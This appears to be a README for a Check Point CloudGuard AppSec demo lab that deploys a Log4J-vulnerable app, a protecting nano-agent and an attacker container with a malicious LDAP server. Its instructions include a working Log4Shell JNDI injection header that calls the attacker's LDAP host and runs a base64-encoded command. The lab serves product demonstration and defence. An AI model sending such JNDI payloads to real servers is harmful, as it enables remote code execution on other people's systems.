# Check Point CloudGuard AppSec demo
 
 This is a simple docker-compose environment for deploy a Check Point AppSec embedded nano-agent demo.  
 It will deploy 4 containers, an NGINX reverse proxy, an agent-container (the nano-agent), Log4J vulnerable App and Attacker with malicious LDAP.
 The LDAP malicious server is builded at moment the creation.

You will reach all the Vulnerable application with the exposed 80 port from the NGINX server, the default.conf file already redirects all the request to the app.

## Instructions:
 
* Clone the repository
* From a machine with docker and docker-compose installed, run:  
`  export TOKEN=<your agent token>`  
`  docker-compose up `  
`  from another machine run "curl "http://docker host ip address"" and if you recieve "status":400,"error":"Bad Request","path":"/" as response, the server is properly listening`
`  from the same machine now run "curl "http://docker host ip address":8080 -H 'X-Api-Version: ${jndi:ldap://malicious:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'" this last request inject the LDAP call in the log and the Log4J vulnerable dependency try to execute it, connecting to the malicious server and executing a "touch /tmp/pwned" command`
`  in the docker host we can run "docker ps" and look for a container with the name log4shell-log4shell grab the ID and run "docker logs -f "ID of container"" you will see the logs of the server when executes the command`
`  in the docker host again we can run with the same container ID 'docker exec "ID of container" ls /tmp/' and you will see the file created by the attack`
`  docker-compose down `  
 

> Notes: 
> There are two ways to run docker compose: `docker-compose` and `docker compose`. Using `docker compose` (with a space, not a hyphen) is 'experimental' from a Docker perspective and seems to decide on its own value for IPC configuration and breaks this setup. Use `docker-compose` please :).
> I you want to learn more about the Reverse Proxy, you can see the 'default' file inside the /nginx-reverse-proxy folder, this is mounted to the container to provide Host Rules and Ingress Routes
